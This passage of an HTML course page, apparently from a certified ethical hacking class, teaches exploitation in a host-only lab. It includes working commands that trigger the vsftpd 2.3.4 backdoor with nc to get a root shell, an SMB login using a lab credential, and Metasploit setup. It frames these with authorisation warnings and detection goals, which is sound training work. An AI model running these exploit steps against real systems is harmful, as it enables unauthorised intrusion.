@@ -1,0 +1,1138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 05 — System Hacking II: Exploitation, Shells &amp; Payloads | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 5 — turn the Session 4 access plan into code execution: manual exploitation vs Metasploit, EternalBlue to SYSTEM on Windows 7, bind vs reverse shells, staged vs stageless payloads with msfvenom, catching shells, upgrading to a TTY/meterpreter, credential-based access, and a guided buffer overflow — every attack carried through to its process/network SOC flip, ending in a working reverse-shell detection rule and a per-host foothold record.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s05">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 05</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 05 · Pages</h5>
+    <ol id="sessionNav"></ol>
+    <div class="side-cta">
+      <h5>Deliverable</h5>
+      <a href="report.html">📋 Open Team Report</a>
+    </div>
+  </aside>
+
+  <article>
+
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <section class="page" data-title="Welcome">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05</span><span class="tag offensive">System Hacking II · Execute</span><span class="time">&#9201; 4 hours</span></div>
+      <h1>Exploitation, Shells &amp; Payloads</h1>
+      <p class="lede">You found the way in and got the key in Session 4. This is where you <strong>turn it</strong> — into code execution and an interactive shell on the target.</p>
+    </div>
+    <div class="content">
+      <div class="oneline">Recon was invisible (S2). Scanning was loud (S3). Session 4 turned enumeration into a
+        <b>vulnerability</b> and a <b>credential</b>. Today you turn that into a <b>shell</b> — manual first, then Metasploit,
+        then the payloads and shells that actually come back, and the buffer overflow that explains why exploits exist at all.</div>
+
+      <h2><span class="h-t">Today&#39;s agenda</span></h2>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:12%"><col style="width:59%"><col style="width:17%"><col style="width:12%"></colgroup>
+        <thead><tr><th>Block</th><th>What we do</th><th>Format</th><th>Min</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Where we left off &mdash; the access plan becomes today&#39;s execution list</td><td>Theory</td><td>7</td></tr>
+          <tr><td>2</td><td><strong>Lab pre-flight</strong> &mdash; targets up, access plan in hand, <span class="mono">msfconsole</span> ready</td><td>Hands-on</td><td>5</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; Half A · Exploitation (CVE &rarr; code execution) &mdash;</td></tr>
+          <tr><td>3</td><td>The exploitation pipeline + read a PoC before you run it</td><td>Theory</td><td>8</td></tr>
+          <tr><td>4</td><td><strong>Lab 1</strong> &mdash; exploit vsftpd 2.3.4 <em>by hand</em> on Metasploitable2</td><td>Hands-on</td><td>15</td></tr>
+          <tr><td>5</td><td>The Metasploit framework &mdash; the module model + <span class="mono">msfconsole</span></td><td>Theory</td><td>9</td></tr>
+          <tr><td>6</td><td><strong>Lab 2</strong> &mdash; the same vuln <em>via Metasploit</em> (manual vs framework)</td><td>Hands-on</td><td>12</td></tr>
+          <tr><td>7</td><td>EternalBlue as a worked chain (MS17-010, matched in S4)</td><td>Theory</td><td>7</td></tr>
+          <tr><td>8</td><td><strong>Lab 3</strong> &mdash; EternalBlue on Windows 7 &rarr; <strong>SYSTEM</strong> shell</td><td>Hands-on</td><td>15</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; Half B · Shells &amp; Payloads (what comes back) &mdash;</td></tr>
+          <tr><td>9</td><td>Bind vs reverse &mdash; <em>why reverse wins</em> through NAT/firewalls</td><td>Theory</td><td>8</td></tr>
+          <tr><td>10</td><td><strong>Lab 4</strong> &mdash; bind blocked, reverse gets out (the failure that teaches)</td><td>Hands-on</td><td>12</td></tr>
+          <tr><td>11</td><td>Staged vs stageless payloads + <span class="mono">msfvenom</span></td><td>Theory</td><td>9</td></tr>
+          <tr><td>&mdash;</td><td>Break</td><td>&mdash;</td><td>10</td></tr>
+          <tr><td>12</td><td><strong>Lab 5</strong> &mdash; <span class="mono">msfvenom</span> + <span class="mono">multi/handler</span>: build a payload, catch the shell</td><td>Hands-on</td><td>14</td></tr>
+          <tr><td>13</td><td>Shell upgrade &mdash; dumb shell &rarr; TTY &rarr; meterpreter (intro)</td><td>Theory</td><td>7</td></tr>
+          <tr><td>14</td><td><strong>Lab 6</strong> &mdash; upgrade a dumb shell to a real one</td><td>Hands-on</td><td>10</td></tr>
+          <tr><td>15</td><td>Credential-based access &mdash; a credential <em>is</em> an exploit</td><td>Theory</td><td>6</td></tr>
+          <tr><td>16</td><td><strong>Lab 7</strong> &mdash; <span class="mono">psexec</span>/<span class="mono">evil-winrm</span> with an S4 credential</td><td>Hands-on</td><td>10</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; The mechanism · defence · deliverable &mdash;</td></tr>
+          <tr><td>17</td><td>Buffer overflow &amp; RCE &mdash; the stack, step by step</td><td>Theory</td><td>12</td></tr>
+          <tr><td>18</td><td><strong>Lab 8</strong> &mdash; guided buffer overflow (saved-state at every step)</td><td>Hands-on</td><td>20</td></tr>
+          <tr><td>19</td><td>The reverse-shell callback, as the SOC sees it</td><td>Defender</td><td>6</td></tr>
+          <tr><td>20</td><td><strong>Lab 9</strong> &mdash; write the reverse-shell detection rule (signature exercise)</td><td>Hands-on</td><td>16</td></tr>
+          <tr><td>21</td><td><strong>Lab 10</strong> &mdash; assemble the foothold record (Session 6&#39;s input)</td><td>Hands-on</td><td>12</td></tr>
+          <tr><td>22</td><td>Into Session 6 &mdash; privilege escalation starts from your shell</td><td>Theory</td><td>6</td></tr>
+          <tr><td>23</td><td>Knowledge check &middot; practice range &middot; homework</td><td>Wrap-up</td><td>19</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box key-takeaway"><span class="box-t">What you hand in today</span><p>Two things. A <strong>foothold record</strong> &mdash; per host: the exploit or credential that got you in, the payload,
+      the shell type, and <strong>what user context you landed as</strong> (e.g. <span class="mono">NT AUTHORITY\SYSTEM</span> on
+      Win7 via EternalBlue vs a low-priv service account on Metasploitable2). And <strong>one working reverse-shell / exploit
+      detection rule</strong> (Sigma / SPL / KQL) from evidence you generate yourself. The foothold record is Session 6&#39;s input;
+      the rule is the job.</p></div>
+      <div class="box warn"><span class="box-t">Authorisation — read before anything</span><p>Every exploit today runs against <strong>your own host-only lab</strong> &mdash; Metasploitable2, Windows 7, and the
+      <span class="mono">ceh.lab</span> domain. Firing an exploit, catching a shell, or overflowing a buffer on any host you do not own
+      is a criminal offence. The lab hands you the target <em>and</em> the authorisation; that authorisation does not travel.</p></div>
+      <div class="box soc"><span class="box-t">The spine of the session</span><p>Exploitation is <strong>loud and leaves artefacts</strong>: a crashed service, a new process, a service account suddenly
+      spawning <span class="mono">cmd.exe</span>, an outbound connection to the attacker. Recon and scanning could be argued as
+      research &mdash; a reverse shell cannot. So every attack today carries its SOC flip (process creation 4688 / Sysmon 1, network
+      connection Sysmon 3, IDS signatures), and the session ends with you writing the detection rule from evidence you generated.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where we left off">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P02</span><span class="tag theory">Bridge · S4 &rarr; S5</span><span class="time">&#9201; 7 min</span></div>
+      <h1>Take Out Your Access Plan. Today We Execute It.</h1>
+      <p class="lede">Session 4&#39;s deliverable is Session 5&#39;s input. Every &quot;chosen way in&quot; you wrote down is an exploit you fire today.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is one continuous story</span><p>You did not finish Session 4 with trivia &mdash; you finished it with a <strong>plan</strong>: per host, a confirmed vulnerability with its CVE and whether a public exploit exists, plus a credential and how you got it. That plan is the execution list for today. We do <em>not</em> re-teach vuln analysis or cracking &mdash; we turn their output into shells.</p></div>
+
+      <h2><span class="h-t">The kill chain &mdash; you are here</span></h2>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 262" role="img" aria-label="The engagement chain: recon in Session 2, scanning in Session 3, vulnerability and credential in Session 4, exploitation in Session 5 which is highlighted, and privilege escalation in Session 6.">
+          <rect x="125" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--text-3)"/>
+          <text class="d-title" x="250" y="54" text-anchor="middle" font-size="14" fill="var(--text-3)">Recon &rarr; Scan &rarr; Creds</text>
+          <text class="d-sub" x="250" y="70" text-anchor="middle">S2 &middot; S3 &middot; S4</text>
+          <line x1="250" y1="80" x2="250" y2="240" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="565" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="690" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">YOU ARE HERE</text>
+          <text class="d-sub" x="690" y="70" text-anchor="middle">S5 &middot; Exploit</text>
+          <line x1="690" y1="80" x2="690" y2="240" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">S4 gave you: CVE + &quot;public exploit? yes/no&quot;  &middot;  a credential + how</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">fire the chosen way in</text>
+          <path d="M256,174 L684,174" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--purple)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--purple)">S5 gives S6: a shell + the USER CONTEXT you landed as</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>The access plan. Open it now &mdash; it is literally today&#39;s to-do list.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>For each host you pick one path: an exploit (EternalBlue, vsftpd&hellip;) <b>or</b> a credential (psexec/evil-winrm). Today you run it.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Your foothold record &mdash; SYSTEM here, low-priv there &mdash; is exactly what Session 6 (privilege escalation) starts from.</div>
+        </figure>
+
+      <h2><span class="h-t">The two questions this session answers</span></h2>
+      <div class="split">
+        <div class="box attacker-view"><span class="box-t">1 &middot; How do I turn a matched CVE into a running process?</span><p>Manual exploitation (find &rarr; read the PoC &rarr; configure &rarr; fire &rarr; verify), then the same thing with <strong>Metasploit</strong> &mdash; so you see manual vs framework side by side and understand exactly what the framework automates.</p></div>
+        <div class="box attacker-view"><span class="box-t">2 &middot; What actually comes back, and how do I keep it?</span><p><strong>Bind vs reverse</strong> shells and why reverse wins, <strong>staged vs stageless</strong> payloads, <span class="mono">msfvenom</span> generation, catching shells, and upgrading a dumb shell to a real TTY / meterpreter.</p></div>
+      </div>
+      <div class="box key-takeaway"><span class="box-t">One line to carry all session</span><p><strong class="hl">A credential is an exploit, and an exploit is a shell.</strong> Everything today is one of those two paths ending in the same place: your code running on their machine.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab pre-flight">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P03</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Pre-flight: Targets Up, Handler Ready</h1>
+      <p class="lede">Ninety seconds of checks now saves a dead lab later. Confirm the targets answer and Metasploit starts.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why a pre-flight</span><p>Every lab today fires at a specific host. If Win7 is off, or Metasploit&#39;s database is not connected, you lose ten minutes mid-exploit. Confirm the range now, once.</p></div>
+      <ol class="steps">
+<li>
+<strong>Confirm the targets are reachable</strong> from Kali on the host-only network.
+<pre><code>ping -c1 192.168.56.102   # Metasploitable2
+ping -c1 192.168.56.107   # WIN7-TGT01 (may drop ICMP; the SMB check below is the real test)
+nmap -p445 --open 192.168.56.107   # 445 open = Win7 up and SMB reachable</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Metasploitable2 replies; Win7 shows <span class="mono">445/tcp open</span></li></ul></div>
+</li>
+<li>
+<strong>Start Metasploit and connect its database</strong> (fast search + loot storage).
+<pre><code>sudo msfdb init          # once per machine
+msfconsole -q
+msf6 &gt; db_status         # =&gt; [*] Connected to msf. Connection type: postgresql.</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">db_status</span> reports <strong>Connected</strong></li><li>Your S4 access plan is open beside you</li></ul></div>
+</li>
+<li>
+<strong>Confirm your S4 credentials still work</strong> (you will need one in Lab 7).
+<pre><code>nxc smb 192.168.56.20 -u m.said -p 'Autumn2025!'   # from the S4 spray  =&gt; [+] ceh.lab\m.said (Pwn3d! or valid)</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>At least one S4 credential still authenticates to the domain</li></ul></div>
+</li>
+</ol>
+      <div class="box warn"><span class="box-t">Snapshot discipline</span><p>Take a <span class="mono">pre-s5</span> snapshot of every target now. Exploits <em>crash services</em> &mdash; that is part of the lesson &mdash; and you will want a clean revert between attempts. Reverting is faster than rebuilding.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The exploitation pipeline">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P04</span><span class="tag theory">Method · the whole path</span><span class="time">&#9201; 8 min</span></div>
+      <h1>From a Matched CVE to a Running Process</h1>
+      <p class="lede">Every exploit &mdash; manual or Metasploit &mdash; walks the same six steps. See them once and the tools stop being magic.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the pipeline before the tools</span><p>In Session 4 you ended each host with &quot;public exploit? yes.&quot; That <em>yes</em> is the entry to this pipeline. Whether you type the exploit by hand or let Metasploit drive, the shape is identical &mdash; and knowing the shape is what lets you debug a broken exploit instead of just trying another.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 150" role="img" aria-label="The exploitation pipeline: matched CVE, then find the PoC, read and understand it, configure it, fire it, and get a shell. Click each step.">
+          <g class="node" data-node="e1" tabindex="0"><rect x="8" y="46" width="140" height="56" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="78" y="70" text-anchor="middle" font-size="12">1 &middot; Matched CVE</text><text class="d-sub" x="78" y="88" text-anchor="middle">from S4</text></g>
+          <g class="node" data-node="e2" tabindex="0"><rect x="160" y="46" width="140" height="56" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="230" y="70" text-anchor="middle" font-size="12">2 &middot; Find the PoC</text><text class="d-sub" x="230" y="88" text-anchor="middle">searchsploit</text></g>
+          <g class="node" data-node="e3" tabindex="0"><rect x="312" y="46" width="140" height="56" rx="9" fill="#1a1f2a" stroke="#fbbf24"/><text class="d-title" x="382" y="70" text-anchor="middle" font-size="12">3 &middot; Read it</text><text class="d-sub" x="382" y="88" text-anchor="middle">understand first</text></g>
+          <g class="node" data-node="e4" tabindex="0"><rect x="464" y="46" width="140" height="56" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="534" y="70" text-anchor="middle" font-size="12">4 &middot; Configure</text><text class="d-sub" x="534" y="88" text-anchor="middle">IP / port / offsets</text></g>
+          <g class="node" data-node="e5" tabindex="0"><rect x="616" y="46" width="140" height="56" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="686" y="70" text-anchor="middle" font-size="12">5 &middot; Fire</text><text class="d-sub" x="686" y="88" text-anchor="middle">send the exploit</text></g>
+          <g class="node" data-node="e6" tabindex="0"><rect x="768" y="46" width="164" height="56" rx="9" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="850" y="70" text-anchor="middle" font-size="12" fill="#4ade80">6 &middot; Shell</text><text class="d-sub" x="850" y="88" text-anchor="middle">verify execution</text></g>
+          <path d="M148,74 L158,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M300,74 L310,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M452,74 L462,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M604,74 L614,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M756,74 L766,74" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each step &mdash; and note that Metasploit automates 4&ndash;6, never 3.</div>
+        <div class="dgm-detail" data-detail="e1"><h5><span class="dd-tag">STEP 1</span>A matched CVE</h5><p><b>Service + version &rarr; a known weakness with a public exploit.</b> This is exactly the &quot;confirmed vulnerability + public exploit: yes&quot; line from your S4 access plan. Without it you are guessing.</p></div>
+        <div class="dgm-detail" data-detail="e2"><h5><span class="dd-tag">STEP 2</span>Find the PoC</h5><p><b>Locate a working proof-of-concept.</b> <span class="mono">searchsploit &lt;product&gt; &lt;version&gt;</span> (carried from S4) points into Exploit-DB; a &quot;(Metasploit)&quot; tag means a reliable module already exists.</p></div>
+        <div class="dgm-detail" data-detail="e3"><h5><span class="dd-tag">STEP 3 · the one that matters</span>Read it before you run it</h5><p><b>Open the exploit and understand what it does.</b> What port, what payload, does it need editing, could it crash the box? Running code you have not read is how you take down production or pop a shell on the wrong host. <span class="hl hl-w">Metasploit never does this step for you.</span></p></div>
+        <div class="dgm-detail" data-detail="e4"><h5><span class="dd-tag">STEP 4</span>Configure</h5><p><b>Set the target and your callback.</b> RHOSTS (victim), LHOST/LPORT (you), and for a buffer overflow the <em>offset</em> and a <em>JMP ESP</em> address. Get one wrong and it silently fails.</p></div>
+        <div class="dgm-detail" data-detail="e5"><h5><span class="dd-tag">STEP 5</span>Fire</h5><p><b>Send it.</b> The exploit delivers a payload that hijacks execution on the target. Loud &mdash; this is the first step a SOC can see.</p></div>
+        <div class="dgm-detail" data-detail="e6"><h5><span class="dd-tag">STEP 6</span>Shell &mdash; verify</h5><p><b>Confirm code execution.</b> <span class="mono">whoami</span>, <span class="mono">id</span>, <span class="mono">hostname</span>. <em>Which user</em> you landed as is the single most important thing to record &mdash; it is where Session 6 begins.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; find the PoC for a service you matched in S4</span><pre><code>searchsploit vsftpd 2.3.4
+# vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
+# vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb</code></pre><p style="margin-top:8px"><b>You should see:</b> at least one hit named for the <b>exact</b> version, and a <span class="mono">(Metasploit)</span> line &mdash; a reliable module exists. That is step 2 done; Lab 1 does steps 3&ndash;6 by hand.</p></div>
+      <div class="box key-takeaway"><span class="box-t">The rule of step 3</span><p><strong class="hl">Read the exploit before you run it.</strong> A framework can find, configure and fire for you &mdash; it cannot understand the exploit <em>for</em> you. That understanding is the difference between an ethical hacker and someone running strangers&#39; code.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 1: manual exploit">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P05</span><span class="tag lab">Hands-on · everyone · steps 3&ndash;6</span><span class="time">&#9201; 15 min</span></div>
+      <h1>Lab 1 &mdash; Exploit vsftpd 2.3.4 By Hand</h1>
+      <p class="lede">No framework. You will trigger a backdoor with a raw connection and catch a root shell &mdash; so Metasploit never feels like magic.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why manual first</span><p>vsftpd 2.3.4 shipped with a <strong>backdoor</strong>: a username ending in <span class="mono">:)</span> opens a root bind shell on port 6200. You will trigger it with nothing but <span class="mono">nc</span> &mdash; reading the PoC, firing it, and verifying. Tomorrow&#39;s Lab 2 does the identical thing through Metasploit, and you will know exactly what it automated.</p></div>
+      <div class="box lab-box"><span class="box-t">Target &amp; authorisation</span><p>Target: <span class="mono">METASPLOITABLE2 &middot; 192.168.56.102</span>, your own host-only VM. The vsftpd backdoor is a real 2011 supply-chain compromise &mdash; a perfect teaching artefact, and lab-only.</p></div>
+      <ol class="steps">
+<li>
+<strong>Step 3 &mdash; read the PoC.</strong> The mechanism, in one line: a login whose <em>username</em> ends in <span class="mono">:)</span> makes vsftpd open a root shell on <span class="mono">6200</span>. No password needed &mdash; the trigger is the smiley.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You can state what the exploit does and which port the shell lands on <em>before</em> running it</li></ul></div>
+</li>
+<li>
+<strong>Step 4&ndash;5 &mdash; trigger it by hand.</strong> Two connections: one to send the poisoned username, one to reach the shell.
+<pre><code>nc 192.168.56.102 21
+USER hacker:)
+PASS whatever
+# (in a SECOND terminal, the backdoor is now listening on 6200)
+nc 192.168.56.102 6200</code></pre>
+<div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">nc · vsftpd 2.3.4</span></div>
+  <div class="sim-body">
+<span class="l cmd">nc 192.168.56.102 21</span>
+<span class="l dim">220 (vsFTPd 2.3.4)</span>
+<span class="l cmd">USER hacker:)</span>
+<span class="l dim">331 Please specify the password.</span>
+<span class="l cmd">PASS x</span>
+<span class="l warn">(hangs — the backdoor bound a shell on 6200)</span>
+<span class="l cmd">nc 192.168.56.102 6200</span>
+<span class="l cmd root">id</span>
+<span class="l ok">uid=0(root) gid=0(root)</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">&#8635; Replay</button><span class="sim-note"><b>The smiley is the trigger.</b> No exploit code &mdash; a poisoned username.</span></div>
+</div>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The second <span class="mono">nc</span> connects to <span class="mono">6200</span> and gives a blank prompt (a shell with no banner)</li></ul></div>
+</li>
+<li>
+<strong>Step 6 &mdash; verify code execution and record the context.</strong>
+<pre><code>id        # uid=0(root)  <-- you are ROOT on Metasploitable2
+hostname  # metasploitable
+whoami</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">id</span> returns <strong>uid=0(root)</strong></li><li>Foothold record row: host=MSF2, via=vsftpd 2.3.4 backdoor, shell=bind/6200, <strong>landed as root</strong></li></ul></div>
+</li>
+</ol>
+      <div class="box key-takeaway"><span class="box-t">What you produced</span><p>A <strong>root shell</strong> from a raw <span class="mono">nc</span> connection &mdash; you read the mechanism, fired it, and verified. That is the whole pipeline, by hand. Now watch Metasploit compress it to three lines &mdash; and know what those three lines hide.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="The Metasploit framework">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S05 &middot; P06</span><span class="tag theory">Method · demystified</span><span class="time">&#9201; 9 min</span></div>
+      <h1>The Framework: One Model, Four Module Types</h1>
+      <p class="lede">Metasploit is not magic &mdash; it is an <strong>exploit</strong> plus a <strong>payload</strong> plus <strong>options</strong>, producing a <strong>session</strong>. Learn that shape and every module makes sense.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the model before the commands</span><p>Students who memorise <span class="mono">use / set / exploit</span> get lost the moment a module behaves differently. Students who know <em>exploit + payload + options &rarr; session</em> can drive any of the 2000+ modules. Here is the whole mental model.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 210" role="img" aria-label="The Metasploit model: an exploit plus a payload plus options produces a session; auxiliary modules scan and post modules run after a session. Click each part.">
+          <g class="node" data-node="m1" tabindex="0"><rect x="20" y="40" width="200" height="54" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="120" y="63" text-anchor="middle" font-size="12.5" fill="#ff7043">EXPLOIT</text><text class="d-sub" x="120" y="81" text-anchor="middle">delivers the payload</text></g>
+          <text class="d-title" x="245" y="72" text-anchor="middle" font-size="18">+</text>
+          <g class="node" data-node="m2" tabindex="0"><rect x="270" y="40" width="200" height="54" rx="9" fill="#1a1f2a" stroke="#a78bfa"/><text class="d-title" x="370" y="63" text-anchor="middle" font-size="12.5" fill="#a78bfa">PAYLOAD</text><text class="d-sub" x="370" y="81" text-anchor="middle">the code that runs</text></g>
+          <text class="d-title" x="495" y="72" text-anchor="middle" font-size="18">+</text>
+          <g class="node" data-node="m3" tabindex="0"><rect x="520" y="40" width="200" height="54" rx="9" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="620" y="63" text-anchor="middle" font-size="12.5">OPTIONS</text><text class="d-sub" x="620" y="81" text-anchor="middle">RHOSTS / LHOST&hellip;</text></g>
+          <path d="M740,67 L768,67" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-grn)"/>
+          <g class="node" data-node="m4" tabindex="0"><rect x="772" y="40" width="150" height="54" rx="9" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="847" y="63" text-anchor="middle" font-size="12.5" fill="#4ade80">SESSION</text><text class="d-sub" x="847" y="81" text-anchor="middle">your shell</text></g>
+          <g class="node" data-node="m5" tabindex="0"><rect x="120" y="132" width="300" height="50" rx="9" fill="#1f2533" stroke="#333b4c"/><text class="d-title" x="270" y="154" text-anchor="middle" font-size="12">AUXILIARY</text><text class="d-sub" x="270" y="171" text-anchor="middle">scan / enumerate (no payload)</text></g>
+          <g class="node" data-node="m6" tabindex="0"><rect x="520" y="132" width="300" height="50" rx="9" fill="#1f2533" stroke="#333b4c"/><text class="d-title" x="670" y="154" text-anchor="middle" font-size="12">POST</text><text class="d-sub" x="670" y="171" text-anchor="middle">run AFTER you have a session</text></g>
+          <path d="M270,110 L270,130" stroke="#768290" stroke-width="1.3" stroke-dasharray="4 3" marker-end="url(#ar-g)"/>
+          <path d="M847,96 C847,120 700,120 670,130" fill="none" stroke="#4ade80" stroke-width="1.3" stroke-dasharray="4 3" marker-end="url(#ar-grn)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the four module types and how a session is born.</div>
+        <div class="dgm-detail" data-detail="m1"><h5><span class="dd-tag">EXPLOIT</span>The delivery vehicle</h5><p><b>Code that abuses a specific vulnerability</b> to get <em>your</em> payload executed on the target. <span class="mono">use exploit/windows/smb/ms17_010_eternalblue</span>. One exploit, many compatible payloads.</p></div>
+        <div class="dgm-detail" data-detail="m2"><h5><span class="dd-tag">PAYLOAD</span>What actually runs</h5><p><b>The code that runs after the exploit lands</b> &mdash; a reverse shell, a bind shell, or <span class="mono">meterpreter</span>. <span class="mono">show payloads</span> lists the ones compatible with the chosen exploit. This is the &quot;what comes back&quot; of Half B.</p></div>
+        <div class="dgm-detail" data-detail="m3"><h5><span class="dd-tag">OPTIONS</span>Wiring it to reality</h5><p><b>The variables that point the module at the real world:</b> <span class="mono">RHOSTS</span> (target), <span class="mono">LHOST</span>/<span class="mono">LPORT</span> (your listener), <span class="mono">PAYLOAD</span>. <span class="mono">show options</span> reveals which are required. Blank required option = it will not fire.</p></div>
+        <div class="dgm-detail" data-detail="m4"><h5><span class="dd-tag">SESSION</span>The result</h5><p><b>A live connection to the target.</b> <span class="mono">sessions -l</span> lists them, <span class="mono">sessions -i 1</span> interacts. This is your foothold &mdash; and its <em>user context</em> is what you record.</p></div>
